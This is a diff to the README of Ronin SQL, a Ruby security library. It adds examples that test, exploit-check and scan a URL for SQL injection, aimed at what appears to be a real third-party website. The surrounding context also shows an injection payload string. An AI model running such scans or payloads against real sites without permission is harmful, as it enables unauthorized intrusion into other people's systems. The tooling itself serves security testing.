@@ -66,6 +66,24 @@ install or update Overlays.
     }.to_s
     # => "' AND (SELECT count(*) FROM users) = 1 --"
 
+* Test a URL for SQL Injection (SQLi):
+
+    require 'ronin/sql'
+
+    url = URI('http://redteatrosalternativos.com/_05enlaces/links/phpHoo3.php?viewCat=1')
+    url.has_sqli?
+    # => true
+
+* Get the first viable SQLi vulnerability:
+
+    url.sqli
+    # => #<Ronin::SQL::Injection: ...>
+
+* Scan a URL for SQLi vulnerabilities:
+
+    url.sqli_scan
+    # => [#<Ronin::SQL::Injection: ...>, ...]
+
 == LICENSE:
 
 Ronin SQL - A Ruby library for Ronin that provids support for SQL related
